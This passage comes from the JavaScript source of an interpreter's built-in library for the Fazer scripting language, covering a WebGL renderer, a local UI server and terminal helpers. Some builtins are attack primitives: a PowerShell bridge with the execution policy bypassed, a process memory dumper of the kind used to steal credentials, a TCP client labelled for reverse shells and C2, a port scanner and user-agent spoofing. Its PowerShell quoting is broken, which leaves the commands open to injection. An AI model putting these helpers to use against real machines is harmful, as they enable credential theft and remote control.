                     ctx.fillStyle = cmd.color;
                     ctx.fillRect(cmd.x, cmd.y, size, size);
                }
            });
        }
    </script>
</body>
</html>
          `,

          // WebGL 2.0 Renderer (3D)
          _get_renderer_html_3d: () => `
<!DOCTYPE html>
<html>
<head>
    <style>body{margin:0;overflow:hidden;background:#000;}canvas{display:block;width:100vw;height:100vh;}</style>
</head>
<body>
    <canvas id="glcanvas"></canvas>
    <canvas id="overlay" style="position:absolute;top:0;left:0;pointer-events:none;width:100vw;height:100vh;"></canvas>
    <script>
        const canvas = document.getElementById('glcanvas');
        const gl = canvas.getContext('webgl2');
        if (!gl) { alert("WebGL2 not supported"); }
        
        const overlay = document.getElementById('overlay');
        const ctx = overlay.getContext('2d');

        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            gl.viewport(0, 0, canvas.width, canvas.height);
            
            overlay.width = window.innerWidth;
            overlay.height = window.innerHeight;
        }
        window.onresize = resize;
        resize();

        // --- TinyMath ---
        const Mat4 = {
            create: () => new Float32Array([1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1]),
            perspective: (out, fovy, aspect, near, far) => {
                const f = 1.0 / Math.tan(fovy / 2);
                const nf = 1 / (near - far);
                out[0] = f / aspect; out[1] = 0; out[2] = 0; out[3] = 0;
                out[4] = 0; out[5] = f; out[6] = 0; out[7] = 0;
                out[8] = 0; out[9] = 0; out[10] = (far + near) * nf; out[11] = -1;
                out[12] = 0; out[13] = 0; out[14] = (2 * far * near) * nf; out[15] = 0;
            },
            lookAt: (out, eye, center, up) => {
                let x0, x1, x2, y0, y1, y2, z0, z1, z2, len;
                let eyex = eye[0], eyey = eye[1], eyez = eye[2];
                let upx = up[0], upy = up[1], upz = up[2];
                let centerx = center[0], centery = center[1], centerz = center[2];

                z0 = eyex - centerx; z1 = eyey - centery; z2 = eyez - centerz;
                len = 1 / Math.sqrt(z0 * z0 + z1 * z1 + z2 * z2);
                z0 *= len; z1 *= len; z2 *= len;

                x0 = upy * z2 - upz * z1; x1 = upz * z0 - upx * z2; x2 = upx * z1 - upy * z0;
                len = Math.sqrt(x0 * x0 + x1 * x1 + x2 * x2);
                if (!len) { x0 = 0; x1 = 0; x2 = 0; } else { len = 1 / len; x0 *= len; x1 *= len; x2 *= len; }

                y0 = z1 * x2 - z2 * x1; y1 = z2 * x0 - z0 * x2; y2 = z0 * x1 - z1 * x0;
                len = Math.sqrt(y0 * y0 + y1 * y1 + y2 * y2);
                if (!len) { y0 = 0; y1 = 0; y2 = 0; } else { len = 1 / len; y0 *= len; y1 *= len; y2 *= len; }

                out[0] = x0; out[1] = y0; out[2] = z0; out[3] = 0;
                out[4] = x1; out[5] = y1; out[6] = z1; out[7] = 0;
                out[8] = x2; out[9] = y2; out[10] = z2; out[11] = 0;
                out[12] = -(x0 * eyex + x1 * eyey + x2 * eyez);
                out[13] = -(y0 * eyex + y1 * eyey + y2 * eyez);
                out[14] = -(z0 * eyex + z1 * eyey + z2 * eyez);
                out[15] = 1;
            },
            translate: (out, a, v) => {
                let x = v[0], y = v[1], z = v[2];
                out[12] = a[0] * x + a[4] * y + a[8] * z + a[12];
                out[13] = a[1] * x + a[5] * y + a[9] * z + a[13];
                out[14] = a[2] * x + a[6] * y + a[10] * z + a[14];
                out[15] = a[3] * x + a[7] * y + a[11] * z + a[15];
            },
            rotate: (out, a, rad, axis) => {
                let x = axis[0], y = axis[1], z = axis[2];
                let len = Math.sqrt(x * x + y * y + z * z);
                if (Math.abs(len) < 0.000001) return;
                len = 1 / len; x *= len; y *= len; z *= len;
                let s = Math.sin(rad), c = Math.cos(rad), t = 1 - c;
                let a00 = a[0], a01 = a[1], a02 = a[2], a03 = a[3];
                let a10 = a[4], a11 = a[5], a12 = a[6], a13 = a[7];
                let a20 = a[8], a21 = a[9], a22 = a[10], a23 = a[11];
                let b00 = x * x * t + c, b01 = y * x * t + z * s, b02 = z * x * t - y * s;
                let b10 = x * y * t - z * s, b11 = y * y * t + c, b12 = z * y * t + x * s;
                let b20 = x * z * t + y * s, b21 = y * z * t - x * s, b22 = z * z * t + c;
                out[0] = a00 * b00 + a10 * b01 + a20 * b02;
                out[1] = a01 * b00 + a11 * b01 + a21 * b02;
                out[2] = a02 * b00 + a12 * b01 + a22 * b02;
                out[3] = a03 * b00 + a13 * b01 + a23 * b02;
                out[4] = a00 * b10 + a10 * b11 + a20 * b12;
                out[5] = a01 * b10 + a11 * b11 + a21 * b12;
                out[6] = a02 * b10 + a12 * b11 + a22 * b12;
                out[7] = a03 * b10 + a13 * b11 + a23 * b12;
                out[8] = a00 * b20 + a10 * b21 + a20 * b22;
                out[9] = a01 * b20 + a11 * b21 + a21 * b22;
                out[10] = a02 * b20 + a12 * b21 + a22 * b22;
                out[11] = a03 * b20 + a13 * b21 + a23 * b22;
            },
            scale: (out, a, v) => {
                let x = v[0], y = v[1], z = v[2];
                out[0] = a[0] * x; out[1] = a[1] * x; out[2] = a[2] * x; out[3] = a[3] * x;
                out[4] = a[4] * y; out[5] = a[5] * y; out[6] = a[6] * y; out[7] = a[7] * y;
                out[8] = a[8] * z; out[9] = a[9] * z; out[10] = a[10] * z; out[11] = a[11] * z;
                out[12] = a[12]; out[13] = a[13]; out[14] = a[14]; out[15] = a[15];
            },
            copy: (out, a) => { for(let i=0; i<16; i++) out[i] = a[i]; }
        };

        // --- Shader ---
        const vsSource = \`
            attribute vec3 position;
            attribute vec3 color;
            attribute vec3 normal;
            uniform mat4 uP;
            uniform mat4 uV;
            uniform mat4 uM;
            uniform vec3 uLightDir;
            varying vec3 vColor;
            void main() {
                gl_Position = uP * uV * uM * vec4(position, 1.0);
                
                // Lighting (Directional)
                vec3 norm = normalize(mat3(uM) * normal); 
                vec3 lightDir = normalize(uLightDir); 
                float diff = max(dot(norm, lightDir), 0.3); // Ambient 0.3
                vColor = color * diff;
            }
        \`;
        const fsSource = \`
            precision mediump float;
            varying vec3 vColor;
            void main() {
                gl_FragColor = vec4(vColor, 1.0);
            }
        \`;

        function createShader(gl, type, source) {
            const shader = gl.createShader(type);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
                console.error(gl.getShaderInfoLog(shader));
                gl.deleteShader(shader);
                return null;
            }
            return shader;
        }

        const vs = createShader(gl, gl.VERTEX_SHADER, vsSource);
        const fs = createShader(gl, gl.FRAGMENT_SHADER, fsSource);
        const program = gl.createProgram();
        gl.attachShader(program, vs);
        gl.attachShader(program, fs);
        gl.linkProgram(program);

        const locs = {
            pos: gl.getAttribLocation(program, 'position'),
            col: gl.getAttribLocation(program, 'color'),
            norm: gl.getAttribLocation(program, 'normal'),
            P: gl.getUniformLocation(program, 'uP'),
            V: gl.getUniformLocation(program, 'uV'),
            M: gl.getUniformLocation(program, 'uM'),
            light: gl.getUniformLocation(program, 'uLightDir')
        };

        // --- State ---
        const meshes = {};
        const state = {
            camera: { pos: [0,0,5], target: [0,0,0], up: [0,1,0] },
            lightDir: [0.5, 1.0, 0.3],
            P: Mat4.create(),
            V: Mat4.create(),
            M: Mat4.create()
        };

        // --- Events ---
        const events = new EventSource('/_fazer/events');
        events.onmessage = (e) => {
            const msg = JSON.parse(e.data);
            if (msg.type === 'gfx_frame') render(msg.data);
            if (msg.type === 'mesh_upload') uploadMesh(msg.data);
        };

        // --- Input ---
        const inputs = { keys: {}, mouse: {x:0, y:0, down:false} };
        window.onkeydown = (e) => { inputs.keys[e.key] = true; sendInput(); };
        window.onkeyup = (e) => { inputs.keys[e.key] = false; sendInput(); };
        window.onmousemove = (e) => { inputs.mouse.x = e.clientX; inputs.mouse.y = e.clientY; sendInput(); };
        window.onmousedown = () => { inputs.mouse.down = true; sendInput(); };
        window.onmouseup = () => { inputs.mouse.down = false; sendInput(); };
        function sendInput() {
            fetch('/_fazer/send', { method: 'POST', body: JSON.stringify({ type: 'input', inputs: inputs }) });
        }

        // --- Logic ---
        function uploadMesh(data) {
            // data: { id, vertices, colors, normals }
            const vao = gl.createVertexArray();
            gl.bindVertexArray(vao);

            const vBuf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, vBuf);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data.vertices), gl.STATIC_DRAW);
            gl.enableVertexAttribArray(locs.pos);
            gl.vertexAttribPointer(locs.pos, 3, gl.FLOAT, false, 0, 0);

            const cBuf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, cBuf);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data.colors), gl.STATIC_DRAW);
            gl.enableVertexAttribArray(locs.col);
            gl.vertexAttribPointer(locs.col, 3, gl.FLOAT, false, 0, 0);

            if (data.normals && locs.norm >= 0) {
                const nBuf = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, nBuf);
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data.normals), gl.STATIC_DRAW);
                gl.enableVertexAttribArray(locs.norm);
                gl.vertexAttribPointer(locs.norm, 3, gl.FLOAT, false, 0, 0);
            }

            meshes[data.id] = { vao: vao, count: data.vertices.length / 3 };
        }

        function render(queue) {
            gl.viewport(0, 0, canvas.width, canvas.height);
            gl.enable(gl.DEPTH_TEST);
            gl.enable(gl.CULL_FACE);

            queue.forEach(cmd => {
                if (cmd.op === 'clear') {
                    // Parse hex color or object
                    let r = 0.1, g = 0.1, b = 0.1;
                    if (cmd.color) {
                        if (typeof cmd.color === 'string') {
                            if (cmd.color.startsWith('#')) {
                                const hex = cmd.color.substring(1);
                                r = parseInt(hex.substring(0,2), 16)/255;
                                g = parseInt(hex.substring(2,4), 16)/255;
                                b = parseInt(hex.substring(4,6), 16)/255;
                            }
                        } else if (typeof cmd.color === 'object') {
                            r = cmd.color.r !== undefined ? cmd.color.r : 0.1;
                            g = cmd.color.g !== undefined ? cmd.color.g : 0.1;
                            b = cmd.color.b !== undefined ? cmd.color.b : 0.1;
                        }
                    }
                    gl.clearColor(r, g, b, 1.0);
                    gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
                    
                    // Clear Overlay
                    ctx.clearRect(0, 0, overlay.width, overlay.height);
                    
                    // Update Matrices
                    Mat4.perspective(state.P, 45 * Math.PI / 180, canvas.width/canvas.height, 0.1, 1000.0);
                }
                else if (cmd.op === 'rect') {
                     ctx.fillStyle = cmd.color;
                     ctx.fillRect(cmd.x, cmd.y, cmd.w, cmd.h);
                }
                else if (cmd.op === 'circle') {
                     ctx.beginPath();
                     ctx.arc(cmd.x, cmd.y, cmd.r, 0, Math.PI * 2);
                     ctx.fillStyle = cmd.color;
                     ctx.fill();
                }
                else if (cmd.op === 'line') {
                     ctx.beginPath();
                     ctx.moveTo(cmd.x1, cmd.y1);
                     ctx.lineTo(cmd.x2, cmd.y2);
                     ctx.strokeStyle = cmd.color;
                     ctx.lineWidth = cmd.width || 1;
                     ctx.stroke();
                }
                else if (cmd.op === 'text') {
                    ctx.font = (cmd.size || 20) + 'px monospace';
                    ctx.fillStyle = cmd.color || 'white';
                    ctx.fillText(cmd.text, cmd.x, cmd.y);
                }
                else if (cmd.op === 'camera') {
                    state.camera.pos = [cmd.x, cmd.y, cmd.z];
                    state.camera.target = [cmd.tx, cmd.ty, cmd.tz];
                    Mat4.lookAt(state.V, state.camera.pos, state.camera.target, state.camera.up);
                }
                else if (cmd.op === 'light') {
                    state.lightDir = [cmd.x, cmd.y, cmd.z];
                }
                else if (cmd.op === 'draw_mesh') {
                    const mesh = meshes[cmd.id];
                    if (!mesh) return;

                    gl.useProgram(program);
                    gl.bindVertexArray(mesh.vao);

                    // Model Matrix
                    const M = state.M;
                    const I = [1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1];
                    Mat4.copy(M, I);
                    Mat4.translate(M, M, [cmd.x, cmd.y, cmd.z]);
                    Mat4.rotate(M, M, cmd.rx || 0, [1, 0, 0]);
                    Mat4.rotate(M, M, cmd.ry || 0, [0, 1, 0]);
                    Mat4.rotate(M, M, cmd.rz || 0, [0, 0, 1]);
                    Mat4.scale(M, M, [cmd.sx || 1, cmd.sy || 1, cmd.sz || 1]);

                    gl.uniformMatrix4fv(locs.P, false, state.P);
                    gl.uniformMatrix4fv(locs.V, false, state.V);
                    gl.uniformMatrix4fv(locs.M, false, M);
                    
                    if (locs.light) gl.uniform3fv(locs.light, state.lightDir);

                    gl.drawArrays(gl.TRIANGLES, 0, mesh.count);
                }
            });
        }
    </script>
</body>
</html>
          `
      },


      // [SYS] System & DLL Manipulation
      sys: {
          // Spawn Process (Async)
          spawn: async (cmd, args, opts) => {
             const cp = require("child_process");
             const options = { shell: true, env: { ...process.env } };
             
             let onStdout, onStderr;
             
             if (typeof opts === 'function') {
                 // Legacy support: (cmd, args, onStdout, onStderr)
                 onStdout = opts;
                 onStderr = arguments[3];
             } else if (opts && typeof opts === 'object') {
                 if (opts.env) Object.assign(options.env, opts.env);
                 onStdout = opts.onStdout;
                 onStderr = opts.onStderr;
             }

             const child = cp.spawn(String(cmd), Array.isArray(args) ? args : [], options);
             
             // Store child for stdin access
             this.children.set(child.pid, child);
             child.on('exit', () => this.children.delete(child.pid));

             if (onStdout && onStdout.__fnref__) {
                child.stdout.on('data', async (data) => {
                     await this._call(onStdout, [data.toString()], this.global);
                });
             }
             if (onStderr && onStderr.__fnref__) {
                child.stderr.on('data', async (data) => {
                     await this._call(onStderr, [data.toString()], this.global);
                });
             }
             return child.pid;
          },

          // Kill Process
          kill: (pid) => {
              try { process.kill(Number(pid)); return true; } catch(e) { return false; }
          },

          // Write to Process Stdin
          write_stdin: (pid, data) => {
              const child = this.children.get(Number(pid));
              if (child) {
                  child.stdin.write(String(data));
                  return true;
              }
              return false;
          },

          // PowerShell Bridge (The Core)
          ps: (script) => {
              try {
                  const cmd = `powershell -NoProfile -ExecutionPolicy Bypass -Command "& { ${String(script).replace(/"/g, '\"')} }"`;
                  return require("child_process").execSync(cmd, { encoding: 'utf8', maxBuffer: 1024*1024*50 }).trim();
              } catch(e) { return "Error: " + e.message; }
          },
          
          ps_json: (script) => {
             try {
                 const s = String(script).replace(/"/g, '\"');
                 const cmd = `powershell -NoProfile -ExecutionPolicy Bypass -Command "& { ${s} } | ConvertTo-Json -Depth 2 -Compress"`;
                 const out = require("child_process").execSync(cmd, { encoding: 'utf8', maxBuffer: 1024*1024*50 }).trim();
                 return JSON.parse(out);
             } catch(e) { return null; }
          },

          // DLL / Assembly Loading & Execution
          dll_load: (path) => {
              // Loads a DLL into the current PS session context (simulated via static calls for now)
              // Since each sys.ps call is a new process, we need a way to persist or use a single session.
              // For now, we provide a helper to generate the loading script snippet.
              return `[System.Reflection.Assembly]::LoadFrom("${String(path).replace(/\\/g, '\\\\')}");`;
          },
          
          // Native Memory Forensic (Read Process Memory)
          mem_dump: (pid, outputFile) => {
              // Uses MiniDumpWriteDump via P/Invoke in PowerShell
              const ps = `
$code = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

public class MiniDump {
    [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);

    public static void Dump(int pid, string filename) {
        Process target = Process.GetProcessById(pid);
        using (FileStream fs = new FileStream(filename, FileMode.Create, FileAccess.ReadWrite, FileShare.Write)) {
            MiniDumpWriteDump(target.Handle, (uint)target.Id, fs.SafeFileHandle, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
"@
Add-Type -TypeDefinition $code -Language CCSharp
[MiniDump]::Dump(${Number(pid)}, "${String(outputFile)}")
"Done"
`;
              try {
                  require("child_process").execSync(`powershell -NoProfile -Command "${ps.replace(/"/g, '\"')}"`);
                  return true;
              } catch(e) { return false; }
          },
          
          // Process Manipulation
          
          // Administrator Check
          is_admin: () => {
              try {
                  const out = require("child_process").execSync('powershell -Command "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"', { encoding: 'utf8' }).trim();
                  return out === "True";
              } catch(e) { return false; }
          }
      },

      // [NET] Advanced Network Operations
      net: {
          // TCP Listener
          listen: (port, on_connect) => {
              const net = require("net");
              const server = net.createServer(async (socket) => {
                  const client = {
                      ip: socket.remoteAddress,
                      send: (d) => { try { socket.write(String(d)); return true; } catch(e){ return false; } },
                      close: () => socket.destroy(),
                      on_data: (fn) => {
                          socket.on('data', async (d) => {
                              if (fn && fn.__fnref__) await this._call(fn, [d.toString()], this.global);
                          });
                      }
                  };
                  if (on_connect && on_connect.__fnref__) {
                      await this._call(on_connect, [client], this.global);
                  }
              });
              
              server.on('error', (e) => console.error("Net Error:", e.message));
              server.listen(Number(port));
              
              return {
                  close: () => server.close()
              };
          },

          // Socket Connect / Port Scan
          connect: async (host, port, timeout=2000) => {
             return new Promise(resolve => {
                 const socket = new (require("net").Socket)();
                 socket.setTimeout(Number(timeout));
                 socket.on('connect', () => { socket.destroy(); resolve(true); });
                 socket.on('timeout', () => { socket.destroy(); resolve(false); });
                 socket.on('error', (e) => { socket.destroy(); resolve(false); });
                 socket.connect(Number(port), String(host));
             });
          },

          // Persistent TCP Client (Reverse Shell / C2)
          tcp_connect: (host, port, on_connect) => {
              const net = require("net");
              const socket = new net.Socket();
              
              const client = {
                  send: (d) => { try { socket.write(String(d)); return true; } catch(e){ return false; } },
                  close: () => socket.destroy(),
                  on_data: (fn) => {
                       socket.on('data', async (d) => {
                           if (fn && fn.__fnref__) await this._call(fn, [d.toString()], this.global);
                       });
                  }
              };
              
              socket.connect(Number(port), String(host), async () => {
                  if (on_connect && on_connect.__fnref__) {
                      await this._call(on_connect, [client], this.global);
                  }
              });
              
              socket.on('error', (e) => console.error("TCP Client Error:", e.message));
              return client;
          },
          
          // Get Public IP (External)
          public_ip: async () => {
              try {
                  const res = await builtins.fetch("https://api.ipify.org");
                  return res.body;
              } catch(e) { return "0.0.0.0"; }
          },
          
          // DNS Lookup
          dns: async (domain) => {
             const dns = require("dns").promises;
             try { return await dns.resolve(String(domain)); } catch(e) { return []; }
          },
          
          // Network Interfaces
          interfaces: () => require("os").networkInterfaces()
      },

      // [OSINT] Open Source Intelligence Tools
      osint: {
          // Whois Query
          whois: async (domain) => {
              return new Promise(resolve => {
                  const client = require("net").createConnection(43, "whois.iana.org", () => {
                      client.write(domain + "\r\n");
                  });
                  let data = "";
                  client.on("data", (chunk) => data += chunk);
                  client.on("end", () => resolve(data));
                  client.on("error", (err) => resolve("Error: " + err.message));
              });
          },
          
          // Google Dorking Helper (Generates URL)
          dork_url: (query) => {
              return "https://www.google.com/search?q=" + encodeURIComponent(String(query));
          },
          
          // User Agent Generator
          ua: () => {
              const agents = [
                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
                  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
              ];
              return agents[Math.floor(Math.random() * agents.length)];
          }
      },




      fs: {
          read: (path) => { try { return require('fs').readFileSync(String(path), 'utf8'); } catch(e) { return null; } },
          write: (path, data) => { try { require('fs').writeFileSync(String(path), String(data)); return true; } catch(e) { return false; } },
          append: (path, data) => { try { require('fs').appendFileSync(String(path), String(data)); return true; } catch(e) { return false; } },
          exists: (path) => require('fs').existsSync(String(path)),
          mkdir: (path) => { try { require('fs').mkdirSync(String(path), {recursive:true}); return true; } catch(e) { return false; } },
          list: (path) => { try { return require('fs').readdirSync(String(path)); } catch(e) { return []; } },
          delete: (path) => { try { require('fs').rmSync(String(path), {recursive:true, force:true}); return true; } catch(e) { return false; } }
      },

      // [WEBVIEW] Modern HTML/CSS UI
      webview: {
          _clients: new Set(),
          
          send: (type, data) => {
              const msg = JSON.stringify({ type: type, data: data });
              builtins.webview._clients.forEach(c => c.res.write(`data: ${msg}\n\n`));
          },

          start: async (config, callback) => {
              // config: { root: "ui", port: 0, title: "App", width: 800, height: 600 }
              const http = require('http');
              const fs = require('fs');
              const path = require('path');
              const root = path.resolve(String(config.root || "."));
              const port = Number(config.port) || 0;
              
              // Check for Preview Mode
              if (process.env.FAZER_PREVIEW) {
                  config.open = false;
              }

              return new Promise((resolve) => {
                  const server = http.createServer((req, res) => {
                      // Handle favicon.ico to avoid 404 noise
                      if (req.url === '/favicon.ico') {
                          res.writeHead(204); res.end(); return;
                      }

                      // If config.html is provided (e.g. from GFX module), serve it directly for root
                      if (config.html && req.url === '/') {
                          res.writeHead(200, { 'Content-Type': 'text/html' });
                          res.end(config.html, 'utf-8');
                          return;
                      }

                      let filePath = path.join(root, req.url === '/' ? 'index.html' : req.url);
                      // Security check
                      if (!filePath.startsWith(root)) {
                          res.writeHead(403); res.end('Forbidden'); return;
                      }
                      
                      const ext = path.extname(filePath);
                      const mime = {
                          '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css',
                          '.json': 'application/json', '.png': 'image/png', '.jpg': 'image/jpeg',
                          '.svg': 'image/svg+xml', '.ico': 'image/x-icon', '.ttf': 'font/ttf',
                          '.woff': 'font/woff', '.woff2': 'font/woff2'
                      }[ext] || 'text/plain';

                      fs.readFile(filePath, (err, content) => {
                          if (err) {
                              if (err.code === 'ENOENT') { res.writeHead(404); res.end('Not Found'); }
                              else { res.writeHead(500); res.end('Error: ' + err.code); }
                          } else {
                              res.writeHead(200, { 'Content-Type': mime });
                              res.end(content, 'utf-8');
                          }
                      });
                  });

                  // Event endpoint
                  const oldHandler = server.listeners('request')[0];
                  server.removeAllListeners('request');
                  server.on('request', (req, res) => {
                      if (req.url === '/_fazer/events') {
                          res.writeHead(200, {
                              'Content-Type': 'text/event-stream',
                              'Cache-Control': 'no-cache',
                              'Connection': 'keep-alive',
                              'Access-Control-Allow-Origin': '*'
                          });
                          const client = { res };
                          builtins.webview._clients.add(client);
                          req.on('close', () => builtins.webview._clients.delete(client));
                          return;
                      }
                      if (req.url === '/_fazer/send' && req.method === 'POST') {
                          let body = '';
                          req.on('data', c => body += c);
                          req.on('end', async () => {
                              try {
                                  const msg = JSON.parse(body);
                                  if (callback && callback.__fnref__) {
                              // Execute Fazer callback
                              await this._call(callback, [msg], this.global);
                          }
                          
                          // Handle Native Game Input
                          if (msg.type === 'input' && builtins.gfx) {
                              builtins.gfx._inputs = msg.inputs;
                          }
                          
                          res.writeHead(200); res.end("OK");
                              } catch(e) {
                                  res.writeHead(400); res.end("Bad Request");
                              }
                          });
                          return;
                      }
                      oldHandler(req, res);
                  });

                  server.listen(port, () => {
                      const url = `http://127.0.0.1:${server.address().port}`;
                      console.log(`[WebView] Server running at ${url}`);
                      
                      if (config.open !== false) {
                          // Launch Browser/Window (simplified for now)
                          // In a real scenario, we'd launch a Chrome/Edge window in app mode
                          require('child_process').exec(`start ${url}`);
                      }
                      resolve(true);
                  });
              });
          }
      },

ascii_art: (text, fontName) => {
          const t = String(text).toUpperCase();
          let fKey = String(fontName || "standard");
          
          // Map display names to keys
          const map = {
              "Big Money-ne": "big_money_ne",
              "miniwi": "miniwi",
              "Slant": "slant",
              "Terrace": "terrace",
              "ANSI Compact": "ansi_compact",
              "ANSI Regular": "ansi_regular",
              "ANSI Shadow": "ansi_shadow",
              "Bloody": "bloody",
              "Classy": "classy",
              "Delta Corps Priest 1": "delta",
              "Elite": "elite",
              "block": "block",
              "standard": "standard"
          };
          
          if (map[fKey]) fKey = map[fKey];
          
          const font = ASCII_FONTS[fKey] || ASCII_FONTS["standard"];
          // Detect height from first char (usually space)
          const space = font[" "] || font["A"]; 
          const height = space ? space.length : 5;
          
          let output = "";
          for (let row = 0; row < height; row++) {
              let line = "";
              for (const char of t) {
                  const charData = font[char] || font[" "];
                  if (charData && charData[row]) {
                      line += charData[row] + " "; 
                  }
              }
              output += line + "\n";
          }
          return output;
      },

      println: (x = "") => (console.log(String(x)), null),
      print: (x = "") => (process.stdout.write(String(x)), null),
      ask: async (prompt = "") => {
        process.stdout.write(String(prompt));
        if (process.stdin.isTTY) process.stdin.setRawMode(false);
        process.stdin.resume();
        return new Promise(resolve => {
            process.stdin.once('data', (chunk) => {
                process.stdin.pause();
                resolve(chunk.toString().replace(/[\r\n]+$/, ""));
            });
        });
      },
      readln: (prompt = "") => builtins.ask(prompt),

      // Terminal / UI Advanced
      term_clear: () => (process.stdout.write("\x1b[2J\x1b[H"), null),
      term_pos: (r, c) => (process.stdout.write(`\x1b[${r};${c}H`), null),
      term_up: (n) => (process.stdout.write(`\x1b[${n}A`), null),
      term_down: (n) => (process.stdout.write(`\x1b[${n}B`), null),
      term_left: (n) => (process.stdout.write(`\x1b[${n}D`), null),
      term_right: (n) => (process.stdout.write(`\x1b[${n}C`), null),
      term_hide: () => (process.stdout.write("\x1b[?25l"), null),
      term_show: () => (process.stdout.write("\x1b[?25h"), null),
      term_size: () => ({ rows: process.stdout.rows, cols: process.stdout.columns }),
      
      term_raw: (enable) => {
        enableRawInput(enable);
        return null;
      },
      term_read: () => {
        return stdinBuffer.length > 0 ? stdinBuffer.shift() : null;
      },
      
      sleep: async (ms) => {
          await new Promise(r => setTimeout(r, Number(ms)));
          return null;
      },

      // Advanced Colors & FX
      rgb: (r, g, b, text) => `\x1b[38;2;${Number(r)};${Number(g)};${Number(b)}m${String(text)}\x1b[0m`,
      bg_rgb: (r, g, b, text) => `\x1b[48;2;${Number(r)};${Number(g)};${Number(b)}m${String(text)}\x1b[0m`,
      gradient: (text, r1, g1, b1, r2, g2, b2) => makeGradient(String(text), [Number(r1), Number(g1), Number(b1)], [Number(r2), Number(g2), Number(b2)]),
      
      // Cursor & Title
      cursor_save: () => (process.stdout.write("\x1b[s"), null),
      cursor_restore: () => (process.stdout.write("\x1b[u"), null),
      cursor_hide: () => (process.stdout.write("\x1b[?25l"), null),
      cursor_show: () => (process.stdout.write("\x1b[?25h"), null),
      term_title: (t) => (process.stdout.write(`\x1b]0;${String(t)}\x07`), null),
      
      // UI Components
      ui_bar: (val, max, width, char) => {
          const v = Number(val); const m = Number(max); const w = Number(width || 20);
          const c = String(char || "█");
          const filled = Math.round((v / m) * w);
          return c.repeat(filled) + " ".repeat(w - filled);
      },


      style: (s, color) => style(s, String(color || "reset")),
      box: (title, ...lines) => box(title, lines),

      readText,
      writeText,
      saveText: (s, p) => { fs.writeFileSync(path.resolve(String(p)), String(s), "utf8"); return null; },
      exists: (p) => fs.existsSync(path.resolve(String(p))),
      
      // Core Utils (Standard Library)
      fs_read: (p) => { try { return fs.readFileSync(path.resolve(String(p)), "utf8"); } catch(e) { return null; } },
      fs_write: (p, c) => { try { fs.writeFileSync(path.resolve(String(p)), String(c)); return true; } catch(e) { return false; } },
      fs_exists: (p) => fs.existsSync(path.resolve(String(p))),
      
          // Module System
      import: async (p) => {
          const pAbs = path.resolve(String(p));
          if (!fs.existsSync(pAbs)) return null;
          const code = fs.readFileSync(pAbs, "utf8");
          const lex = lexer.tokenize(code);
          if (lex.errors.length) throw new FazerError("Import Lexer Error: " + lex.errors[0].message);
          const parser = new FazerParser();
          parser.input = lex.tokens;
          const ast = parser.program();
          if (parser.errors.length) throw new FazerError("Import Parser Error: " + parser.errors[0].message);
          
          const rt = new FazerRuntime({ filename: pAbs, code });
          await rt.run(ast);
          
          const exports = {};
          // console.log("Exporting vars from module...");
          for (const [k, v] of rt.global.vars) {
              // console.log("Exporting:", k, v);
              if (k === "__builtins__" || builtins[k]) continue; 
              
              let value = v.value;
              // Handle functions: migrate definition to current runtime
              if (value && typeof value === "object" && value.__fnref__) {
                  const fnName = value.__fnref__;
                  const fnDef = rt.fns.get(fnName);
                  if (fnDef) {
                      const uniqueName = `__import_${Math.floor(Math.random()*1000000)}_${fnName}`;
                      // console.log("Importing function:", fnName, "->", uniqueName);
                      this.fns.set(uniqueName, fnDef);
                      value = { __fnref__: uniqueName };
                  } else {
                      // Debug log
                      console.log("Warning: Function definition not found for", fnName);
                  }
              }
              
              exports[k] = value;
          }
          return exports;
      },
      
      // Persistence (Simple JSON DB)
      db_load: (p) => { try { return JSON.parse(fs.readFileSync(path.resolve(String(p)), "utf8")); } catch(e) { return {}; } },
      db_save: (p, data) => { try { fs.writeFileSync(path.resolve(String(p)), JSON.stringify(data, null, 2)); return true; } catch(e) { return false; } },
      
      // System Automation
      clipboard_set: (text) => {
          if (process.platform === "win32") {
              try {
                  const script = `Set-Clipboard -Value '${String(text).replace(/'/g, "''")}'`;
                  const b64 = Buffer.from(script, 'utf16le').toString('base64');
                  child_process.execSync(`powershell -EncodedCommand ${b64}`);
                  return true;
              } catch(e) { return false; }
          }
          return false;
      },
      clipboard_get: () => {
          if (process.platform === "win32") {
              try { return child_process.execSync(`powershell -command "Get-Clipboard"`).toString().trim(); } catch(e) { return ""; }
          }
          return "";
      },
      notify: (title, msg) => {
          if (process.platform === "win32") {
              const cmd = `
              [reflection.assembly]::loadwithpartialname("System.Windows.Forms");
              [reflection.assembly]::loadwithpartialname("System.Drawing");
              $n = new-object system.windows.forms.notifyicon;
              $n.icon = [system.drawing.systemicons]::information;
              $n.visible = $true;
              $n.showballoontip(10, "${String(title).replace(/"/g, '`"')}", "${String(msg).replace(/"/g, '`"')}", [system.windows.forms.tooltipicon]::none);
              Start-Sleep -s 3;
